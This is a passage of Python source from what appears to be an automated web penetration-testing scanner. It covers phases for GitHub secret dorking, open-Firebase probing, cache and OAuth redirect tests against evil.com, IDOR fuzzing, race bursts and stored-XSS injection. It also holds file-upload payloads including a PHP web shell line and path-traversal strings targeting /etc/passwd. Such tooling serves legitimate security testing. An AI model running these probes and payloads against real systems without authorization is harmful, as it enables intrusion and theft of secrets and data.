                for directive in val_lower.split(";"):
                    directive = directive.strip()
                    if directive and " " in directive:
                        dname, _, dval = directive.partition(" ")
                        directives[dname] = dval
                if "base-uri" not in directives:
                    findings.append(f"  [warn] no base-uri directive — DOM clobbering / injection possible")
                if "object-src" not in directives and "default-src" not in directives:
                    findings.append(f"  [warn] no object-src or default-src — Flash/plugin-based XSS")
                elif "object-src" in directives and "'none'" not in directives.get("object-src", ""):
                    findings.append(f"  [warn] object-src not 'none' — plugin-based XSS possible")
                if "frame-ancestors" not in directives:
                    findings.append(f"  [warn] no frame-ancestors — clickjacking via <frame>/<iframe>")
            except Exception as e:
                findings.append(f"[error] {base} → {e}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"73-CSPBYPASS: {len(findings)} CSP findings → {out}")
    return {"73-CSPBYPASS": str(_out), "count": len(findings)}


# ───────────────────── Phase 74-GHTOOLS: GitHub dorking / supply chain ─────────────────────
async def phase_74_GHTOOLS(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"74-GHTOOLS"}:
        return {}
    _out = outdir / "github_dorking.txt"
    if _out.exists() and not force:
        return {"74-GHTOOLS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 74-GHTOOLS: GitHub dorking + supply chain scanning")
    findings: List[str] = []
    org = domain.split(".")[0] if "." in domain else domain
    gh_dorks = [
        f"org:{org} password",
        f"org:{org} secret",
        f"org:{org} api_key",
        f"org:{org} token",
        f"org:{org} aws_key",
        f"org:{org} .env",
        f"org:{org}-----BEGIN",
        f"\"{domain}\" password",
        f"\"{domain}\" secret",
        f"\"{domain}\" NPM_TOKEN",
        f"\"{domain}\" AWS_ACCESS_KEY",
        f"\"{domain}\" slack_token",
        f"{domain} filename:.env",
        f"{domain} filename:.npmrc",
        f"{domain} filename:.dockercfg",
    ]
    _gh_urlopen = _get_urlopener()
    _gh_token = os.environ.get("GITHUB_TOKEN", "")
    _gh_headers = {"User-Agent": "Mozilla/5.0", **_extra_headers_dict()}
    if _gh_token:
        _gh_headers["Authorization"] = f"Bearer {_gh_token}"
    for dork in gh_dorks[:10]:
        await _throttle_rate()
        try:
            query = urllib.parse.quote(dork)
            url = f"https://api.github.com/search/code?q={query}&per_page=5"
            req = urllib.request.Request(url, headers=_gh_headers)
            _, _, body_bytes = await _async_urlopen(_gh_urlopen, req, timeout=15)
            data = json.loads(body_bytes.decode("utf-8", errors="ignore"))
            total = data.get("total_count", 0)
            findings.append(f"[dork] {dork} → {total} results")
            for item in data.get("items", [])[:3]:
                repo = item.get("repository", {}).get("full_name", "?")
                path = item.get("path", "?")
                html_url = item.get("html_url", "")
                findings.append(f"  {repo}/{path} {html_url}")
        except urllib.error.HTTPError as e:
            if e.code == 403:
                findings.append(f"[dork] {dork} → rate limited (403)")
                if not _gh_token:
                    findings.append("  set GITHUB_TOKEN env var for higher rate limits")
                break
            elif e.code == 422:
                findings.append(f"[dork] {dork} → invalid query")
            else:
                findings.append(f"[dork] {dork} → HTTP {e.code}")
        except Exception as e:
            findings.append(f"[dork] {dork} → {e}")
    findings.append("")
    findings.append("--- Dependency Checks ---")
    tech_file = outdir / "tech.txt"
    if tech_file.exists():
        for ln in read_lines(tech_file):
            if "/" in ln:
                pkg = ln.split()[-1] if ln.split() else ""
                findings.append(f"[tech] {pkg}")
    findings.append("[note] Run 'npm audit' on any found package.json or yarn.lock")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"74-GHTOOLS: {len(findings)} dorking findings → {out}")
    return {"74-GHTOOLS": str(_out), "count": len(findings)}


# ───────────────────── Phase 75-MOBILEAPI: Firebase/mobile API scanning ─────────────────────
async def phase_75_MOBILEAPI(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"75-MOBILEAPI"}:
        return {}
    _out = outdir / "mobile_api.txt"
    if _out.exists() and not force:
        return {"75-MOBILEAPI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 75-MOBILEAPI: Firebase/mobile API surface scanning")
    findings: List[str] = []
    _mb_urlopen = _get_urlopener()
    _mb_headers = _extra_headers_dict()
    base_domain = domain.split(":")[0].lower().strip()
    org_part = base_domain.split(".")[0] if "." in base_domain else base_domain
    # Firebase DB scanning
    firebase_tests = [
        f"https://{org_part}.firebaseio.com/.json",
        f"https://{base_domain.replace('.', '-')}.firebaseio.com/.json",
        f"https://{org_part}.firebaseio.com/.settings/rules.json",
        f"https://{base_domain}.firebaseio.com/.json",
    ]
    for fb_url in firebase_tests:
        await _throttle_rate()
        try:
            req = urllib.request.Request(fb_url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_mb_headers})
            _, _, body_bytes = await _async_urlopen(_mb_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if body.strip() and body.strip() not in ("null", "{}", "[]"):
                findings.append(f"[firebase-open] {fb_url} → data accessible!")
                findings.append(f"  data_preview={body[:200]}")
            else:
                findings.append(f"[firebase-noop] {fb_url} → not open (no data)")
        except urllib.error.HTTPError as e:
            if e.code == 401:
                findings.append(f"[firebase-secured] {fb_url} → HTTP 401 (auth required)")
            else:
                findings.append(f"[firebase-checked] {fb_url} → HTTP {e.code}")
        except Exception as e:
            findings.append(f"[firebase-error] {fb_url} → {e}")
    # Firebase API key scanning in URLs
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        for ln in read_lines(urls_file):
            if "firebaseio.com" in ln or "firebase" in ln.lower():
                findings.append(f"[firebase-ref] {ln}")
            for pat in ("AIza", "key=", "apiKey=", "authDomain="):
                if pat in ln and "firebase" in ln.lower():
                    findings.append(f"[firebase-key] {ln[:150]}")
    # Check for common mobile API patterns in harvested URLs
    mobile_patterns = ["/api/v", "/mobile/", "/app/", "/android/", "/ios/",
                       ".json", ".plist", ".apk", ".ipa", ".mobileconfig"]
    if urls_file and read_lines(urls_file):
        for url in read_lines(urls_file):
            for pat in mobile_patterns:
                if pat in url.lower():
                    findings.append(f"[mobile-endpoint] {url}")
                    break
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"75-MOBILEAPI: {len(findings)} mobile findings → {out}")
    return {"75-MOBILEAPI": str(_out), "count": len(findings)}


# ───────────────────── Phase 76-WORKFLOW: multi-step workflow bypass ─────────────────────
async def phase_76_WORKFLOW(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"76-WORKFLOW"}:
        return {}
    _out = outdir / "workflow_bypass.txt"
    if _out.exists() and not force:
        return {"76-WORKFLOW": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 76-WORKFLOW: multi-step workflow bypass detection")
    findings: List[str] = []
    _wf_urlopen = _get_urlopener()
    _wf_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "76-WORKFLOW: no URLs; skipping")
        return {"76-WORKFLOW": str(_out), "count": 0}
    # Identify potential workflow endpoints (checkout, order, payment, submit, etc.)
    workflow_keywords = {
        "cart", "checkout", "order", "payment", "billing", "submit",
        "confirm", "complete", "register", "enroll", "purchase",
        "booking", "reservation", "checkin", "review", "apply",
    }
    workflow_urls: List[str] = []
    for u in read_lines(urls_file):
        u_lower = u.lower()
        if any(kw in u_lower for kw in workflow_keywords):
            workflow_urls.append(u)
    if not workflow_urls:
        findings.append("[result] No workflow endpoints detected")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"76-WORKFLOW": str(_out), "count": 0}
    findings.append(f"[workflow-endpoints] found {len(workflow_urls)} potential workflow endpoints")
    for u in sorted(set(workflow_urls))[:30]:
        findings.append(f"  {u}")
    # Test direct access to POST-only endpoints via GET (workflow skip)
    _wf_sem = asyncio.Semaphore(10)
    for u in sorted(set(workflow_urls))[:10]:
        base = u if u.startswith("http") else f"https://{u}"
        async with _wf_sem:
            await _throttle_rate()
            for method in ("GET", "POST", "PUT", "PATCH", "DELETE"):
                try:
                    req = urllib.request.Request(base, method=method,
                        headers={"User-Agent": "Mozilla/5.0", **_wf_headers})
                    status, _, _ = await _async_urlopen(_wf_urlopen, req, timeout=10)
                    if status in (200, 201, 202, 204):
                        findings.append(f"[bypass] {method} {base} → HTTP {status} (may skip workflow)")
                except urllib.error.HTTPError as e:
                    if e.code in (401, 403):
                        pass
                    elif e.code in (405, 501):
                        findings.append(f"[expected] {method} {base} → HTTP {e.code} (method not allowed)")
                    else:
                        findings.append(f"[probed] {method} {base} → HTTP {e.code}")
                except Exception as e:
                    pass
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"76-WORKFLOW: {len(findings)} workflow findings → {out}")
    return {"76-WORKFLOW": str(_out), "count": len(findings)}


# ───────────────────── Phase 77-CACHEKEY: cache key probing ─────────────────────
async def phase_77_CACHEKEY(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"77-CACHEKEY"}:
        return {}
    _out = outdir / "cache_key_probe.txt"
    if _out.exists() and not force:
        return {"77-CACHEKEY": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 77-CACHEKEY: cache key composition probing")
    findings: List[str] = []
    _ck_urlopen = _get_urlopener()
    _ck_headers = _extra_headers_dict()
    targets_file = outdir / "host_targets.txt"
    if not targets_file.exists() or not read_lines(targets_file):
        log("warn", "77-CACHEKEY: no targets; skipping")
        return {"77-CACHEKEY": str(_out), "count": 0}
    _ck_sem = asyncio.Semaphore(5)
    def _cache_key_signature(headers: Any) -> str:
        age = headers.get("age", "0")
        cf_cache = headers.get("cf-cache-status", headers.get("x-cache", ""))
        etag = headers.get("etag", "")[:20]
        last_modified = headers.get("last-modified", "")[:20]
        return f"Age={age} CF={cf_cache} ETag={etag} LM={last_modified}"
    test_headers = [
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-Port", "9999"),
        ("X-Http-Method-Override", "POST"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("Accept", "application/json"),
        ("Accept-Encoding", "gzip"),
        ("X-Forwarded-Proto", "http"),
    ]
    for host in read_lines(targets_file)[:5]:
        base = host if host.startswith("http") else f"https://{host}"
        paths_to_probe = ["/", "/admin", "/api", "/login", "/robots.txt"]
        async with _ck_sem:
            await _throttle_rate()
            for path in paths_to_probe:
                url = f"{base.rstrip('/')}{path}"
                try:
                    baseline_req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_ck_headers})
                    _, baseline_headers, _ = await _async_urlopen(_ck_urlopen, baseline_req, timeout=10)
                    baseline_sig = _cache_key_signature(baseline_headers)
                    for hdr_name, hdr_val in test_headers:
                        await _throttle_rate()
                        try:
                            test_req = urllib.request.Request(url, method="GET",
                                headers={"User-Agent": "Mozilla/5.0", hdr_name: hdr_val, **_ck_headers})
                            _, test_headers_resp, _ = await _async_urlopen(_ck_urlopen, test_req, timeout=10)
                            test_sig = _cache_key_signature(test_headers_resp)
                            if test_sig != baseline_sig:
                                findings.append(f"[cache-key-factor] {url} header={hdr_name}:{hdr_val} differs from baseline")
                                findings.append(f"  baseline={baseline_sig}")
                                findings.append(f"  test={test_sig}")
                        except Exception:
                            continue
                except Exception:
                    continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"77-CACHEKEY: {len(findings)} cache key findings → {out}")
    return {"77-CACHEKEY": str(_out), "count": len(findings)}


# ───────────────────── Phase 78-FILEUPLOADADV: advanced file upload testing ─────────────────────
async def phase_78_FILEUPLOADADV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"78-FILEUPLOADADV"}:
        return {}
    _out = outdir / "file_upload_adv.txt"
    if _out.exists() and not force:
        return {"78-FILEUPLOADADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 78-FILEUPLOADADV: advanced file upload polyglot + path traversal")
    findings: List[str] = []
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "78-FILEUPLOADADV: no URLs; skipping")
        return {"78-FILEUPLOADADV": str(_out), "count": 0}
    upload_indicators = ["upload", "file", "image", "avatar", "profile", "attachment",
                         "document", "import", "media", "photo", "resume", "csv"]
    upload_urls: List[str] = []
    for u in read_lines(urls_file):
        if any(ind in u.lower() for ind in upload_indicators):
            upload_urls.append(u)
    if not upload_urls:
        findings.append("[result] No file upload endpoints discovered")
    else:
        findings.append(f"[upload-endpoints] found {len(upload_urls)} potential upload endpoints")
        for u in sorted(set(upload_urls))[:15]:
            findings.append(f"  {u}")
    findings.append("")
    findings.append("--- Polyglot Test Payloads ---")
    _polyglot_payloads = {
        "svg_xss": '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
        "gif_header": "GIF89a<?php system($_GET['cmd']); ?>",
        "jpg_header": "\xFF\xD8\xFF\xE0<?php echo 'test'; ?>",
        "png_header": "\x89PNG\r\n\x1a\n<?php echo 'test'; ?>",
        "zip_slip": "PK\x03\x04...",
    }
    for name, payload in _polyglot_payloads.items():
        findings.append(f"  [{name}] {payload[:60]}...")
    findings.append("")
    findings.append("--- Path Traversal Payloads ---")
    _traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]
    for payload in _traversal_payloads:
        findings.append(f"  [traversal] filename={payload}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"78-FILEUPLOADADV: {len(findings)} file upload findings → {out}")
    return {"78-FILEUPLOADADV": str(_out), "count": len(findings)}


# ───────────────────── Phase 79-SECRETDIFF: secret rotation detection ─────────────────────
async def phase_79_SECRETDIFF(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"79-SECRETDIFF"}:
        return {}
    _out = outdir / "secret_rotation.txt"
    if _out.exists() and not force:
        return {"79-SECRETDIFF": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 79-SECRETDIFF: cross-scan secret rotation detection")
    findings: List[str] = []
    _state_dir = Path(os.environ.get("XDG_CACHE_HOME", Path.home() / ".cache")) / "reconchain" / "secrets"
    _state_dir.mkdir(parents=True, exist_ok=True)
    _secret_state_file = _state_dir / f"{outdir.name}_secrets.json"
    secret_state: Dict[str, str] = {}
    if _secret_state_file.exists():
        try:
            secret_state = json.loads(_secret_state_file.read_text(encoding="utf-8", errors="ignore"))
        except (json.JSONDecodeError, ValueError):
            secret_state = {}
    current_secrets: Dict[str, str] = {}
    for src_file in [outdir / "js_secrets.txt", outdir / "js_secrets_deep.txt",
                     outdir / "domain_creds.txt", outdir / "secrets.txt"]:
        if src_file.exists():
            for ln in read_lines(src_file):
                if "=" in ln:
                    k, v = ln.split("=", 1)
                    k = k.strip()[:60]
                    v_fp = hashlib.md5(v.strip().encode()).hexdigest()[:16]
                    current_secrets[k] = v_fp
    for key, old_hash in secret_state.items():
        if key not in current_secrets:
            findings.append(f"[removed] {key} — secret no longer present (may have been rotated)")
        elif current_secrets[key] != old_hash:
            findings.append(f"[rotated] {key} — value changed (old_hash={old_hash} new_hash={current_secrets[key]})")
    for key in current_secrets:
        if key not in secret_state:
            findings.append(f"[new] {key} — new secret detected (hash={current_secrets[key]})")
    if not findings:
        findings.append("[result] No secret rotation detected (baseline scan)")
    _secret_state_file.write_text(json.dumps(current_secrets, indent=2))
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"79-SECRETDIFF: {len(findings)} secret rotation findings → {out}")
    return {"79-SECRETDIFF": str(_out), "count": len(findings)}


# ───────────────────── Phase 80-STOREXSS: stored XSS detection via browser ─────────────────────
async def phase_80_STOREXSS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"80-STOREXSS"}:
        return {}
    _out = outdir / "stored_xss.txt"
    if _out.exists() and not force:
        return {"80-STOREXSS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 80-STOREXSS: stored XSS detection via browser re-navigation")
    findings: List[str] = []
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        log("warn", "80-STOREXSS: playwright not installed; skipping (pip install playwright)")
        return {"80-STOREXSS": str(_out), "count": 0}
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "80-STOREXSS: no URLs; skipping")
        return {"80-STOREXSS": str(_out), "count": 0}
    form_urls = [u for u in read_lines(urls_file) if "=" in u][:20]
    if not form_urls:
        log("warn", "80-STOREXSS: no param-bearing URLs; skipping")
        return {"80-STOREXSS": str(_out), "count": 0}
    _CANARY = "rcxsstore" + base64.b64encode(os.urandom(6)).decode().rstrip("=")
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True,
            args=["--headless=new", "--no-sandbox", "--disable-gpu"])
        try:
            for url in form_urls:
                await _throttle_rate()
                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                try:
                    page = await context.new_page()
                    await page.goto(url, timeout=20000, wait_until="domcontentloaded")
                    await page.evaluate(f"window.__rc_canary = '{_CANARY}'")
                    inputs = await page.query_selector_all("input, textarea")
                    for inp in inputs:
                        try:
                            await inp.type(_CANARY, delay=10)
                        except Exception:
                            continue
                    buttons = await page.query_selector_all("button[type=submit], input[type=submit]")
                    for btn in buttons:
                        try:
                            async with page.expect_navigation(timeout=10000):
                                await btn.click()
                        except Exception:
                            continue
                    # Navigate to a few more pages to see if XSS triggers
                    for u2 in form_urls[:5]:
                        try:
                            await page.goto(u2, timeout=10000, wait_until="domcontentloaded")
                            has_canary = await page.evaluate(f"document.body && document.body.innerHTML.includes('{_CANARY}')")
                            if has_canary:
                                findings.append(f"[stored-xss-candidate] {u2} — canary rendered from {url}")
                        except Exception:
                            continue
                except Exception:
                    continue
                finally:
                    await context.close()
        finally:
            await browser.close()
    if not findings:
        findings.append("[result] No stored XSS candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"80-STOREXSS: {len(findings)} stored XSS findings → {out}")
    return {"80-STOREXSS": str(_out), "count": len(findings)}


# ───────────────────── Phase 81-IDORFUZZ: cross-session IDOR diffing ─────────────────────
async def phase_81_IDORFUZZ(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"81-IDORFUZZ"}:
        return {}
    _out = outdir / "idor_fuzz.txt"
    if _out.exists() and not force:
        return {"81-IDORFUZZ": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 81-IDORFUZZ: cross-session IDOR diffing")
    findings: List[str] = []
    _id_urlopen = _get_urlopener()
    _id_headers = _extra_headers_dict()
    cookie_a = os.environ.get("COOKIE_A", os.environ.get("COOKIE", ""))
    cookie_b = os.environ.get("COOKIE_B", "")
    if not cookie_a and not cookie_b:
        log("warn", "81-IDORFUZZ: set COOKIE_A and COOKIE_B env vars for cross-session diffing")
        log("info", "81-IDORFUZZ: running in single-session mode (no diff)")
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "81-IDORFUZZ: no URLs; skipping")
        return {"81-IDORFUZZ": str(_out), "count": 0}
    idor_sensitive_params = ["id", "user_id", "uid", "account", "account_id", "customer",
                             "order", "order_id", "document", "file_id", "profile_id",
                             "invoice", "payment", "transaction", "ref", "token"]
    target_urls: List[str] = []
    for u in read_lines(urls_file):
        u_lower = u.lower()
        if any(p in u_lower for p in idor_sensitive_params):
            target_urls.append(u)
    if not target_urls:
        target_urls = read_lines(urls_file)
    findings.append(f"[idor-targets] {len(target_urls)} candidate URLs")
    _id_sem = asyncio.Semaphore(10)
    for u in sorted(set(target_urls))[:30]:
        if not u.startswith("http"):
            u = f"https://{u}"
        async with _id_sem:
            await _throttle_rate()
            # Probe with different user IDs
            variations = {
                "id": ["1", "2", "1000", "999999", "admin", "00000000-0000-0000-0000-000000000000"],
                "user_id": ["1", "2", "0", "-1", "admin"],
                "uid": ["1", "2", "0", "-1"],
                "account": ["1", "2", "admin"],
                "order": ["1", "2", "1000"],
            }
            parsed = urllib.parse.urlparse(u)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs:
                continue
            for pname in qs:
                if pname.lower() in idor_sensitive_params:
                    for pval in variations.get(pname.lower(), ["1", "2"]):
                        test_qs = qs.copy()
                        test_qs[pname] = [pval]
                        new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                        for session_label, session_cookie in [("A", cookie_a), ("B", cookie_b)]:
                            if not session_cookie:
                                continue
                            try:
                                sess_headers = {"User-Agent": "Mozilla/5.0", "Cookie": session_cookie, **_id_headers}
                                req = urllib.request.Request(test_url, method="GET", headers=sess_headers)
                                status_a, headers_a, body_bytes_a = await _async_urlopen(_id_urlopen, req, timeout=10)
                                findings.append(f"[idor-{session_label}] {test_url} → HTTP {status_a} len={len(body_bytes_a)}")
                            except urllib.error.HTTPError as e:
                                findings.append(f"[idor-{session_label}] {test_url} → HTTP {e.code}")
                            except Exception as e:
                                pass
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"81-IDORFUZZ: {len(findings)} IDOR probes → {out}")
    return {"81-IDORFUZZ": str(_out), "count": len(findings)}


# ───────────────────── Phase 82-OAUTHDEEP: OAuth deep analysis ─────────────────────
async def phase_82_OAUTHDEEP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"82-OAUTHDEEP"}:
        return {}
    _out = outdir / "oauth_deep.txt"
    if _out.exists() and not force:
        return {"82-OAUTHDEEP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 82-OAUTHDEEP: OAuth redirect_uri parser diff + PKCE/state analysis")
    findings: List[str] = []
    _oa_urlopen = _get_urlopener()
    _oa_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    oauth_patterns = [
        "/oauth", "/oauth2", "/auth", "/authorize", "/authorization",
        "/token", "/oauth/token", "/oauth2/token", "/connect/token",
        "client_id=", "redirect_uri=", "response_type=", "scope=",
        ".well-known/openid-configuration", ".well-known/oauth-authorization-server",
    ]
    oauth_urls: List[str] = []
    if urls_file.exists():
        for u in read_lines(urls_file):
            if any(p in u.lower() for p in oauth_patterns):
                oauth_urls.append(u)
    targets_file = outdir / "host_targets.txt"
    if targets_file.exists():
        for h in read_lines(targets_file):
            for p in oauth_patterns:
                if not p.startswith("/"):
                    continue
                url = (h if h.startswith("http") else f"https://{h}") + p
                oauth_urls.append(url)
    findings.append(f"[oauth-endpoints] {len(oauth_urls)} potential OAuth endpoints")
    for u in sorted(set(oauth_urls))[:20]:
        findings.append(f"  {u}")
    # Test redirect_uri parser differentials
    redirect_uri_variants = [
        "https://evil.com",
        "https://{domain}.evil.com",
        "https://{domain}.com.evil.com",
        "https://evil.com/{domain}",
        "https://evil.com/?redirect={domain}",
        "https://{domain}@evil.com",
        "https://{domain}:password@evil.com",
        "https://evil.com\\@{domain}",
        "https://evil.com#@{domain}",
    ]
    findings.append("")
    findings.append("--- redirect_uri parser differentials ---")
    for u in sorted(set(oauth_urls))[:10]:
        if "redirect_uri=" in u.lower():
            for var in redirect_uri_variants[:5]:
                test = u.replace("redirect_uri=", f"redirect_uri={var.replace('{domain}', 'target.com')}")
                findings.append(f"  [redirect-test] {test[:150]}")
        elif u.startswith("http") and "/authorize" in u:
            for var in redirect_uri_variants[:5]:
                sep = "&" if "?" in u else "?"
                test = f"{u}{sep}redirect_uri={var.replace('{domain}', 'target.com')}"
                findings.append(f"  [redirect-test] {test[:150]}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"82-OAUTHDEEP: {len(findings)} OAuth deep findings → {out}")
    return {"82-OAUTHDEEP": str(_out), "count": len(findings)}


# ───────────────────── Phase 83-RACEBURST: turbo race condition ─────────────────────
async def phase_83_RACEBURST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"83-RACEBURST"}:
        return {}
    _out = outdir / "race_burst.txt"
    if _out.exists() and not force:
        return {"83-RACEBURST": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 83-RACEBURST: concurrent request burst race condition detection")
    findings: List[str] = []
    _rb_urlopen = _get_urlopener()
    _rb_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "83-RACEBURST: no URLs; skipping")
        return {"83-RACEBURST": str(_out), "count": 0}
    race_candidates: List[str] = []
    for u in read_lines(urls_file):
        u_lower = u.lower()
        if any(kw in u_lower for kw in ("redeem", "coupon", "voucher", "transfer",
            "vote", "like", "follow", "claim", "submit", "checkout", "purchase",
            "withdraw", "deposit", "refund", "apply", "enroll", "register")):
            race_candidates.append(u)
    if not race_candidates:
        race_candidates = read_lines(urls_file)
    findings.append(f"[race-candidates] {len(race_candidates)} potential race endpoints")
    for u in sorted(set(race_candidates))[:10]:
        findings.append(f"  {u}")
    async def _burst_request(url: str, n: int = 10) -> List[Tuple[int, int]]:
        results: List[Tuple[int, int]] = []
        async def _single() -> Tuple[int, int]:
            req = urllib.request.Request(url, method="GET" if "?" in url else "POST",
                data=urllib.parse.urlencode({"_t": str(hash(url))}).encode() if "?" not in url else None,
                headers={"User-Agent": "Mozilla/5.0", **_rb_headers})
            try:
                status, headers, body = await _async_urlopen(_rb_urlopen, req, timeout=15)
                return (status, len(body))
            except Exception as e:
                return (0, 0)
        results = await asyncio.gather(*[_single() for _ in range(n)])
        return results
    _rb_sem = asyncio.Semaphore(3)
    for u in sorted(set(race_candidates))[:5]:
        base = u if u.startswith("http") else f"https://{u}"
        async with _rb_sem:
            await _throttle_rate()
            results = await _burst_request(base, n=10)
            statuses = set(r[0] for r in results)
            lengths = set(r[1] for r in results)
            if len(lengths) > 1:
                findings.append(f"[race-variance] {base} — {len(lengths)} different response lengths in 10 requests")
                findings.append(f"  statuses={statuses} lengths={sorted(lengths)[:5]}")
                findings.append(f"  → manual review recommended for race condition")
            else:
                findings.append(f"[race-stable] {base} — all {len(results)} responses identical (no race detected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"83-RACEBURST: {len(findings)} race burst findings → {out}")
    return {"83-RACEBURST": str(_out), "count": len(findings)}


async def phase_84_WHOIS(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"84-WHOIS"}:
        return {}
    if only and "84-WHOIS" not in only:
        return {}
    _out = outdir / "whois.txt"
    if _out.exists() and not force:
        return {"84-WHOIS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 84-WHOIS: WHOIS registration intelligence")
    findings: List[str] = []
    whois_data = ""
    if t.has("whois"):
        await _run("whois", ["whois", domain], 30, outdir)
        log_path = outdir / "logs" / "whois.log"
        if log_path.exists():
            whois_data = log_path.read_text(encoding="utf-8", errors="ignore")
    else:
        try:
            import socket as _sock
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(10)
            s.connect(("whois.iana.org", 43))
            s.send((domain + "\r\n").encode())
            resp = b""
            recv_total = 0
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                recv_total += len(chunk)
                if recv_total > MAX_RECV:
                    break
                resp += chunk
            s.close()
            whois_data = resp.decode("utf-8", errors="ignore")
        except Exception:
            pass
    if not whois_data:
        log("warn", "84-WHOIS: no WHOIS data retrieved")
        ensure(_out).write_text("[no WHOIS data available]\n")
        return {"84-WHOIS": str(_out), "count": 0}
    fields = {
        "registrant_name": r"(?i)Registrant Name:\s*(.+)",
        "registrant_org": r"(?i)Registrant Organization:\s*(.+)",
        "creation_date": r"(?i)Creation Date:\s*(.+)",
        "expiry_date": r"(?i)(?:Registry Expiry Date|Expiry Date|Expiration Date):\s*(.+)",
        "name_servers": r"(?i)Name Server:\s*(.+)",
        "registrar": r"(?i)Registrar:\s*(.+)",
        "registrant_country": r"(?i)Registrant Country:\s*(.+)",
        "updated_date": r"(?i)Updated Date:\s*(.+)",
        "status": r"(?i)Domain Status:\s*(.+)",
    }
    for label, pattern in fields.items():
        matches = re.findall(pattern, whois_data)
        if matches:
            seen: Set[str] = set()
            for m in matches:
                m = m.strip()
                if m and m not in seen:
                    seen.add(m)
                    findings.append(f"{label}: {m}")
    privacy_indicators = ["privacy", "redacted", "protected", "proxy", "whoisguard", "domains by proxy"]
    is_privacy = any(ind in whois_data.lower() for ind in privacy_indicators)
    if is_privacy:
        findings.append("privacy_protection: YES (registration details hidden)")
    else:
        findings.append("privacy_protection: NO")
